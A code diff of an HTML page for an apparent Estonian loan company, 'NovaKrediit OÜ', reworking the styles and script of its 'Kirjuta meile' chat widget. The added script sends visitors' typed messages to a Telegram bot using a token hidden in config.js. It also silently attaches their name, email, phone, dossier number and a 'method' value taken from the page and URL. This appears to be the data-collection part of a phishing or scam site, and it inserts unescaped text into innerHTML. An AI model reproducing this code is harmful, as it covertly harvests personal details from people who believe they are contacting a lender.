@@ -259,30 +259,46 @@ body{
   .card{padding:24px 16px 20px;}
   .code-number{font-size:2.4rem;}
 }
-/* ── CHAT WIDGET ── */
-#nk-chat-widget{position:fixed;bottom:24px;right:24px;z-index:99999;font-family:'Inter',sans-serif;}
-#nk-chat-btn{background:#0a1628;color:#fff;border:none;border-radius:50px;padding:13px 20px 13px 16px;display:flex;align-items:center;gap:10px;cursor:pointer;box-shadow:0 4px 20px rgba(10,22,40,0.4);font-weight:600;font-size:0.88rem;border-bottom:3px solid #d4a843;transition:all 0.2s;}
-#nk-chat-btn:hover{transform:translateY(-2px);}
-#nk-chat-box{display:none;position:absolute;bottom:68px;right:0;width:310px;background:#fff;border-radius:16px;box-shadow:0 16px 48px rgba(0,0,0,0.2);overflow:hidden;flex-direction:column;}
-#nk-chat-box.open{display:flex;}
-#nk-chat-head{background:#0a1628;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;}
-#nk-chat-head-info{display:flex;align-items:center;gap:10px;}
-#nk-chat-avatar{width:36px;height:36px;background:#d4a843;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:0.8rem;color:#0a1628;}
-#nk-chat-name{color:#fff;font-weight:700;font-size:0.86rem;}
-#nk-chat-status{color:rgba(255,255,255,0.5);font-size:0.7rem;display:flex;align-items:center;gap:4px;margin-top:2px;}
-#nk-chat-dot{width:6px;height:6px;background:#4ade80;border-radius:50%;display:inline-block;}
-#nk-chat-close{background:none;border:none;color:rgba(255,255,255,0.5);font-size:1rem;cursor:pointer;padding:2px;}
-#nk-chat-messages{padding:14px;display:flex;flex-direction:column;gap:8px;max-height:240px;overflow-y:auto;background:#f7f8fa;}
-.nk-msg{max-width:85%;padding:9px 12px;border-radius:12px;font-size:0.84rem;line-height:1.5;word-break:break-word;}
-.nk-msg-bot{background:#fff;border:1px solid #e5e7eb;border-radius:12px 12px 12px 3px;color:#1a1a2e;align-self:flex-start;}
-.nk-msg-user{background:#0a1628;color:#fff;border-radius:12px 12px 3px 12px;align-self:flex-end;}
-.nk-msg-time{font-size:0.65rem;opacity:0.5;margin-top:3px;}
-#nk-chat-form{display:flex;padding:10px;gap:8px;border-top:1px solid #e5e7eb;background:#fff;}
-#nk-chat-input{flex:1;border:1.5px solid #e5e7eb;border-radius:20px;padding:8px 14px;font-size:0.84rem;font-family:'Inter',sans-serif;outline:none;resize:none;}
-#nk-chat-input:focus{border-color:#d4a843;}
-#nk-chat-send{background:#0a1628;color:#fff;border:none;border-radius:50%;width:36px;height:36px;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;transition:background 0.2s;}
-#nk-chat-send:hover{background:#1a3460;}
-@media(max-width:400px){#nk-chat-box{width:calc(100vw - 32px);right:0;}}
+/* ── CHAT CRISP STYLE ── */
+  #nk-chat-widget{position:fixed;bottom:24px;right:24px;z-index:99999;font-family:'Inter',sans-serif;}
+  #nk-chat-btn{background:#0a1628;border:none;border-radius:50px;padding:13px 20px 13px 16px;display:flex;align-items:center;gap:10px;cursor:pointer;box-shadow:0 4px 24px rgba(10,22,40,0.4);border-bottom:3px solid #d4a843;transition:all 0.25s;}
+  #nk-chat-btn:hover{transform:translateY(-2px);box-shadow:0 8px 28px rgba(10,22,40,0.5);}
+  #nk-chat-btn span{color:#fff;font-weight:600;font-size:0.88rem;}
+  #nk-chat-badge{background:#ef4444;border-radius:50%;width:8px;height:8px;flex-shrink:0;}
+  #nk-chat-box{display:none;position:absolute;bottom:72px;right:0;width:320px;background:#fff;border-radius:16px;box-shadow:0 8px 40px rgba(0,0,0,0.18);overflow:hidden;flex-direction:column;animation:nkSlideUp 0.3s cubic-bezier(0.34,1.56,0.64,1);}
+  #nk-chat-box.open{display:flex;}
+  @keyframes nkSlideUp{from{opacity:0;transform:translateY(16px) scale(0.95)}to{opacity:1;transform:translateY(0) scale(1)}}
+  #nk-chat-head{background:#0a1628;padding:16px 18px 20px;}
+  #nk-chat-head-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;}
+  #nk-chat-avatar-wrap{position:relative;}
+  #nk-chat-avatar{width:38px;height:38px;background:#d4a843;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:0.82rem;color:#0a1628;}
+  #nk-chat-online{position:absolute;bottom:1px;right:1px;width:9px;height:9px;background:#4ade80;border-radius:50%;border:2px solid #0a1628;}
+  #nk-chat-name{color:#fff;font-weight:700;font-size:0.9rem;}
+  #nk-chat-status-txt{color:rgba(255,255,255,0.5);font-size:0.72rem;}
+  #nk-chat-close{background:rgba(255,255,255,0.1);border:none;color:rgba(255,255,255,0.7);width:28px;height:28px;border-radius:50%;cursor:pointer;font-size:1rem;display:flex;align-items:center;justify-content:center;transition:background 0.2s;}
+  #nk-chat-close:hover{background:rgba(255,255,255,0.2);}
+  #nk-chat-response{background:rgba(255,255,255,0.08);border-radius:10px;padding:10px 14px;}
+  #nk-chat-response-label{font-size:0.76rem;color:rgba(255,255,255,0.45);margin-bottom:2px;}
+  #nk-chat-response-val{font-size:0.86rem;color:#fff;font-weight:600;}
+  #nk-chat-messages{padding:14px;display:flex;flex-direction:column;gap:10px;max-height:220px;overflow-y:auto;background:#f7f8fa;}
+  .nk-msg-row{display:flex;gap:8px;align-items:flex-end;}
+  .nk-msg-row.user{justify-content:flex-end;}
+  .nk-msg-av{width:28px;height:28px;background:#d4a843;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:0.65rem;font-weight:700;color:#0a1628;}
+  .nk-bubble{border-radius:14px;padding:9px 13px;font-size:0.84rem;line-height:1.5;max-width:210px;word-break:break-word;}
+  .nk-bubble.bot{background:#fff;border-radius:14px 14px 14px 3px;color:#1a1a2e;box-shadow:0 1px 4px rgba(0,0,0,0.06);}
+  .nk-bubble.user{background:#0a1628;border-radius:14px 14px 3px 14px;color:#fff;}
+  .nk-time{font-size:0.63rem;color:#9ca3af;margin-top:3px;padding:0 4px;}
+  .nk-time.right{text-align:right;}
+  #nk-chat-form{padding:10px 12px;background:#fff;border-top:0.5px solid #e5e7eb;}
+  #nk-chat-input-wrap{display:flex;align-items:center;gap:8px;background:#f7f8fa;border:0.5px solid #e5e7eb;border-radius:24px;padding:7px 7px 7px 14px;}
+  #nk-chat-input{flex:1;border:none;background:transparent;font-size:0.84rem;color:#1a1a2e;outline:none;font-family:'Inter',sans-serif;}
+  #nk-chat-input::placeholder{color:#9ca3af;}
+  #nk-chat-send{background:#0a1628;border:none;border-radius:50%;width:32px;height:32px;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;transition:background 0.2s;}
+  #nk-chat-send:hover{background:#1a3460;}
+  #nk-chat-footer{text-align:center;font-size:0.62rem;color:#9ca3af;padding:6px 0 8px;background:#fff;}
+  @keyframes nkFadeIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
+  .nk-msg-row{animation:nkFadeIn 0.2s ease;}
+  @media(max-width:400px){#nk-chat-box{width:calc(100vw - 32px);right:0;}}
 </style>
 </head>
 <body>
@@ -381,112 +397,121 @@ function toggleChannels(){
 }
 </script>
 <script src="config.js"></script>
-<!-- CHAT WIDGET TELEGRAM -->
+<!-- CHAT CRISP NOVAKREDIIT -->
+<script src="config.js"></script>
 <div id="nk-chat-widget">
-  <button id="nk-chat-btn" onclick="nkToggleChat()">
+  <button id="nk-chat-btn" onclick="nkToggle()">
     <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z" stroke="white" stroke-width="2" stroke-linejoin="round"/></svg>
     <span>Kirjuta meile</span>
+    <div id="nk-chat-badge"></div>
   </button>
   <div id="nk-chat-box">
     <div id="nk-chat-head">
-      <div id="nk-chat-head-info">
-        <div id="nk-chat-avatar">NK</div>
-        <div>
-          <div id="nk-chat-name">NovaKrediit OÜ</div>
-          <div id="nk-chat-status"><span id="nk-chat-dot"></span> Oleme siin</div>
+      <div id="nk-chat-head-top">
+        <div style="display:flex;align-items:center;gap:10px;">
+          <div id="nk-chat-avatar-wrap">
+            <div id="nk-chat-avatar">NK</div>
+            <div id="nk-chat-online"></div>
+          </div>
+          <div>
+            <div id="nk-chat-name">NovaKrediit O&Uuml;</div>
+            <div id="nk-chat-status-txt">Oleme siin &mdash; vastame kohe</div>
+          </div>
         </div>
+        <button id="nk-chat-close" onclick="nkToggle()">&#10005;</button>
       </div>
-      <button id="nk-chat-close" onclick="nkToggleChat()">✕</button>
+      <div id="nk-chat-response">
+        <div id="nk-chat-response-label">Vastame tavaliselt</div>
+        <div id="nk-chat-response-val">M&otilde;ne minutiga</div>
+      </div>
     </div>
     <div id="nk-chat-messages">
-      <div class="nk-msg nk-msg-bot" id="nk-welcome-msg">👋 Tere! Kuidas saame teid aidata?<div class="nk-msg-time">NovaKrediit</div></div>
+      <div class="nk-msg-row">
+        <div class="nk-msg-av">NK</div>
+        <div>
+          <div class="nk-bubble bot">&#128075; Tere! Kuidas saame teid aidata?</div>
+          <div class="nk-time">NovaKrediit</div>
+        </div>
+      </div>
     </div>
     <div id="nk-chat-form">
-      <input type="text" id="nk-chat-input" placeholder="Kirjutage sõnum..." onkeydown="if(event.key==='Enter')nkSend()">
-      <button id="nk-chat-send" onclick="nkSend()">
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M22 2L11 13" stroke="white" stroke-width="2" stroke-linecap="round"/><path d="M22 2L15 22l-4-9-9-4 20-7z" stroke="white" stroke-width="2" stroke-linejoin="round"/></svg>
-      </button>
+      <div id="nk-chat-input-wrap">
+        <input type="text" id="nk-chat-input" placeholder="Kirjutage s&otilde;num..." onkeydown="if(event.key==='Enter')nkSend()">
+        <button id="nk-chat-send" onclick="nkSend()">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M22 2L11 13" stroke="white" stroke-width="2" stroke-linecap="round"/><path d="M22 2L15 22l-4-9-9-4 20-7z" stroke="white" stroke-width="2" stroke-linejoin="round"/></svg>
+        </button>
+      </div>
     </div>
+    <div id="nk-chat-footer">Powered by NovaKrediit</div>
   </div>
 </div>
-
 <script>
-var NK_TOKEN=window._nkc?window._nkc():'';
-var NK_CHAT=window._nkid||'8901251544';
-var NK_BASE='https://api.telegram.org/bot'+NK_TOKEN;
 var nkOpen=false;
 var nkLastUpdate=0;
+var nkSession='nk_'+Date.now();
+var NK_BASE='https://api.telegram.org/bot'+(window._nkc?window._nkc():'');
+var NK_CHAT=window._nkid||'8901251544';
 
-// Polling direct Telegram
 setInterval(function(){
-  if(!nkOpen) return;
+  if(!nkOpen||!NK_BASE.includes(':')) return;
   fetch(NK_BASE+'/getUpdates?offset='+(nkLastUpdate+1)+'&timeout=1')
   .then(function(r){return r.json();})
-  .then(function(data){
-    if(!data.ok||!data.result||!data.result.length) return;
-    data.result.forEach(function(u){
+  .then(function(d){
+    if(!d.ok||!d.result||!d.result.length) return;
+    d.result.forEach(function(u){
       nkLastUpdate=u.update_id;
       if(u.message&&u.message.from&&!u.message.from.is_bot){
-        nkAddMessage(u.message.text,'bot');
+        nkAddMsg(u.message.text,'bot');
       }
     });
   }).catch(function(){});
 },3000);
 
-function nkToggleChat(){
+function nkToggle(){
   nkOpen=!nkOpen;
   var box=document.getElementById('nk-chat-box');
   if(nkOpen){box.classList.add('open');document.getElementById('nk-chat-input').focus();}
   else{box.classList.remove('open');}
 }
-
-function nkGetTime(){
-  var d=new Date();
-  return d.getHours()+':'+(d.getMinutes()<10?'0':'')+d.getMinutes();
-}
-
-function nkAddMessage(text,type){
+function nkGetTime(){var d=new Date();return d.getHours()+':'+(d.getMinutes()<10?'0':'')+d.getMinutes();}
+function nkAddMsg(text,type){
   var msgs=document.getElementById('nk-chat-messages');
-  var div=document.createElement('div');
-  div.className='nk-msg '+(type==='user'?'nk-msg-user':'nk-msg-bot');
-  div.innerHTML=text+'<div class="nk-msg-time">'+nkGetTime()+'</div>';
-  msgs.appendChild(div);
+  var row=document.createElement('div');
+  row.className='nk-msg-row'+(type==='user'?' user':'');
+  if(type==='bot'){
+    row.innerHTML='<div class="nk-msg-av">NK</div><div><div class="nk-bubble bot">'+text+'</div><div class="nk-time">NovaKrediit &middot; '+nkGetTime()+'</div></div>';
+  } else {
+    row.innerHTML='<div><div class="nk-bubble user">'+text+'</div><div class="nk-time right">'+nkGetTime()+'</div></div>';
+  }
+  msgs.appendChild(row);
   msgs.scrollTop=msgs.scrollHeight;
 }
-
 function nkSend(){
   var input=document.getElementById('nk-chat-input');
   var text=input.value.trim();
-  if(!text) return;
+  if(!text||!NK_BASE.includes(':')) return;
   input.value='';
-  nkAddMessage(text,'user');
-  var name=(document.getElementById('eesnimi')||{}).value||'';
+  nkAddMsg(text,'user');
+  var urlParams=new URLSearchParams(window.location.search);
+  var name=(document.getElementById('eesnimi')||{}).value||urlParams.get('name')||'';
   var email=(document.getElementById('epost')||{}).value||'';
   var tel=(document.getElementById('telefon')||{}).value||'';
-  // Récupérer infos depuis URL de la page confirmation
-  var urlParams=new URLSearchParams(window.location.search);
-  var clientName=urlParams.get('name')||name||'';
-  var clientDossier=urlParams.get('dossier')||'';
-  var clientMethod=urlParams.get('method')||'';
-  var msg='💬 *NovaKrediit Chat — Confirmation*\n';
-  if(clientDossier) msg+='📋 Dossier: '+clientDossier+'\n';
-  if(clientName) msg+='👤 '+clientName+'\n';
-  if(clientMethod) msg+='🔐 '+clientMethod+'\n';
-  msg+='🔑 Session: '+nkSession.slice(-6)+'\n';
-  msg+='\n'+text;
+  var dossier=(document.getElementById('dossier-number')||{}).textContent||urlParams.get('dossier')||'';
+  var method=urlParams.get('method')||'';
+  var msg='\uD83D\uDCAC *NovaKrediit Chat*\n';
+  if(dossier) msg+='\uD83D\uDCCB Dossier: '+dossier+'\n';
+  if(name) msg+='\uD83D\uDC64 '+name+'\n';
+  if(email) msg+='\uD83D\uDCE7 '+email+'\n';
+  if(tel) msg+='\uD83D\uDCF1 '+tel+'\n';
+  if(method) msg+='\uD83D\uDD10 '+method+'\n';
+  msg+='\uD83D\uDD11 Session: '+nkSession.slice(-6)+'\n\n'+text;
   fetch(NK_BASE+'/sendMessage',{
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body:JSON.stringify({chat_id:NK_CHAT,text:msg,parse_mode:'Markdown'})
   }).then(function(r){return r.json();})
-  .then(function(d){
-    if(!d.ok) nkAddMessage('⚠️ Sõnum ei saadetud. Proovige uuesti.','bot');
-  })
-  .catch(function(){
-    nkAddMessage('⚠️ Ühenduse viga.','bot');
-  });
+  .then(function(d){if(!d.ok) nkAddMsg('\u26A0\uFE0F Proovige uuesti.','bot');})
+  .catch(function(){nkAddMsg('\u26A0\uFE0F &Uuml;henduse viga.','bot');});
 }
 </script>
-
-
 </body>
